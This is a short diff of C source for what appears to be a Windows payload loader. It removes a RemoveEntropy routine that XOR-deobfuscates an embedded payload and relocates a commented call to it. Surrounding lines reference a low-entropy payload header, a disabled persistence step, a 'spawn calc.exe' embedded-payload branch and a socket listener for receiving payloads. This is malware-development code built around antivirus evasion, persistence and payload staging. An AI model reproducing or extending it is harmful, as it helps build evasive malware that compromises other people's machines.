@@ -5,13 +5,6 @@
 #include <time.h>
 #include "low-entropy-payload.h"
 
-
-void RemoveEntropy()
-{
-    for(int i = 0; i < BUFFER_Size; ++i)
-        embeded_payload[i] ^= (embeded_payload[i + BUFFER_Size] << 4);
-}
-
 BOOL IsDuplicate()
 {
     DWORD currentpid = GetCurrentProcessId();
@@ -149,8 +142,8 @@ int main()
     // RunEdit(); /// add persistence
 
     #ifdef PAYLOAD_EMBED    // spawn calc.exe
-    //RemoveEntropy();      //deobfuscate payload
     payload = embeded_payload;
+    //RemoveEntropy();      //deobfuscate payload
     #else
     SOCKET pSocket;
     Listenner(&pSocket);
